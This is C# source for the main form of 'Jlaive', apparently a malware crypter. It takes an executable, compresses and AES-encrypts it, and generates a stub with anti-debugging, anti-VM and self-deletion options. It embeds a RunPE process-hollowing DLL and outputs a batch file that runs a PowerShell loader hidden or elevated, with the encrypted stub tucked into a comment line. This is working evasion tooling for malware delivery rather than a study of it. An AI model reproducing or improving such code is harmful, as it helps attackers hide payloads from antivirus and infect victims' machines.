using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;

using static Jlaive.Utils;

namespace Jlaive
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            SettingsObject obj = Settings.Load();
            if (obj != null) UnpackSettings(obj);
            UpdateKeys();
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            Settings.Save(PackSettings());
            Environment.Exit(0);
        }

        private void openButton_Click(object sender, EventArgs e)
        {
            OpenFileDialog ofd = new OpenFileDialog();
            ofd.RestoreDirectory = true;
            if (ofd.ShowDialog() != DialogResult.OK) return;
            input.Text = ofd.FileName;
        }

        private void buildButton_Click(object sender, EventArgs e)
        {
            if (!File.Exists(input.Text))
            {
                MessageBox.Show("Invalid input path.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }
            if (Path.GetExtension(input.Text) != ".exe")
            {
                MessageBox.Show("Invalid input file.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }
            Crypt(input.Text, Convert.FromBase64String(key.Text), Convert.FromBase64String(iv.Text));
        }

        private void refreshKeys_Click(object sender, EventArgs e) => UpdateKeys();

        private void addFile_Click(object sender, EventArgs e)
        {
            OpenFileDialog ofd = new OpenFileDialog();
            ofd.RestoreDirectory = true;
            if (ofd.ShowDialog() != DialogResult.OK) return;
            bindedFiles.Items.Add(ofd.FileName);
        }

        private void removeFile_Click(object sender, EventArgs e)
        {
            bindedFiles.Items.Remove(bindedFiles.SelectedItem);
        }

        private void Crypt(string _input, byte[] _key, byte[] _iv)
        {
            buildButton.Enabled = false;
            tabControl1.SelectedTab = tabControl1.TabPages["outputPage"];
            log.Items.Clear();

            Random rng = new Random();
            StubGen stubgen = new StubGen(_key, _iv, rng);

            byte[] pbytes = File.ReadAllBytes(_input);
            bool isnetasm = IsAssembly(_input);

            if (isnetasm)
            {
                log.Items.Add("Patching assembly...");
                pbytes = Patcher.Fix(pbytes);
            }

            log.Items.Add("Encrypting payload...");
            byte[] payload_enc = Encrypt(Compress(pbytes), _key, _iv);

            log.Items.Add("Creating stub...");
            string stub = stubgen.CreateCS(antiDebug.Checked, antiVM.Checked, meltFile.Checked, !isnetasm);

            log.Items.Add("Building stub...");
            File.WriteAllBytes("payload.exe", payload_enc);
            if (!isnetasm)
            {
                byte[] runpedll_enc = Encrypt(Compress(GetEmbeddedResource("Jlaive.Resources.runpe.dll")), _key, _iv);
                File.WriteAllBytes("runpe.dll", runpedll_enc);
            }
            List<string> embeddedresources = new List<string>();
            embeddedresources.Add("payload.exe");
            if (!isnetasm) embeddedresources.Add("runpe.dll");
            embeddedresources.AddRange(bindedFiles.Items.Cast<string>());
            Compiler compiler = new Compiler
            {
                References = new string[] { "mscorlib.dll", "System.Core.dll", "System.dll", "System.Management.dll" },
                Resources = embeddedresources.ToArray()
            };
            JCompilerResult result = compiler.Build(stub);
            if (result.CompilerResults.Errors.Count > 0)
            {
                File.Delete("payload.exe");
                if (!isnetasm) File.Delete("runpe.dll");
                string errors = string.Join(Environment.NewLine, result.CompilerResults.Errors.Cast<CompilerError>().Select(error => error.ErrorText));
                MessageBox.Show($"Stub build errors:{Environment.NewLine}{errors}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                buildButton.Enabled = true;
                return;
            }
            File.Delete("payload.exe");
            if (!isnetasm) File.Delete("runpe.dll");

            log.Items.Add("Encrypting stub...");
            byte[] stub_enc = Encrypt(Compress(result.AssemblyBytes), _key, _iv);

            log.Items.Add("Creating PowerShell command...");
            string pscommand = stubgen.CreatePS();

            log.Items.Add("Creating batch file...");
            string content = stubgen.CreateBat(pscommand, hidden.Checked, runas.Checked);
            List<string> content_lines = new List<string>(content.Split(new string[] { Environment.NewLine }, StringSplitOptions.None));
            content_lines.Insert(rng.Next(0, content_lines.Count), ":: " + Convert.ToBase64String(stub_enc));
            content = string.Join(Environment.NewLine, content_lines);

            SaveFileDialog sfd = new SaveFileDialog()
            {
                AddExtension = true,
                DefaultExt = "bat",
                Title = "Save File",
                Filter = "Batch files (*.bat)|*.bat",
                RestoreDirectory = true,
                FileName = Path.ChangeExtension(_input, "bat")
            };
            sfd.ShowDialog();

            log.Items.Add("Writing output...");
            File.WriteAllText(sfd.FileName, content, Encoding.ASCII);

            MessageBox.Show("Done!", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
            UpdateKeys();
            buildButton.Enabled = true;
        }

        private void UpdateKeys()
        {
            AesManaged aes = new AesManaged();
            key.Text = Convert.ToBase64String(aes.Key);
            iv.Text = Convert.ToBase64String(aes.IV);
            aes.Dispose();
        }

        private SettingsObject PackSettings()
        {
            SettingsObject obj = new SettingsObject()
            {
                inputFile = input.Text,
                antiDebug = antiDebug.Checked,
                antiVM = antiVM.Checked,
                selfDelete = meltFile.Checked,
                hidden = hidden.Checked,
                runas = runas.Checked
            };
            List<string> paths = new List<string>();
            foreach (string item in bindedFiles.Items) paths.Add(item);
            obj.bindedFiles = paths.ToArray();
            return obj;
        }

        private void UnpackSettings(SettingsObject obj)
        {
            input.Text = obj.inputFile;
            antiDebug.Checked = obj.antiDebug;
            antiVM.Checked = obj.antiVM;
            meltFile.Checked = obj.selfDelete;
            hidden.Checked = obj.hidden;
            runas.Checked = obj.runas;
            bindedFiles.Items.AddRange(obj.bindedFiles);
        }
    }
}
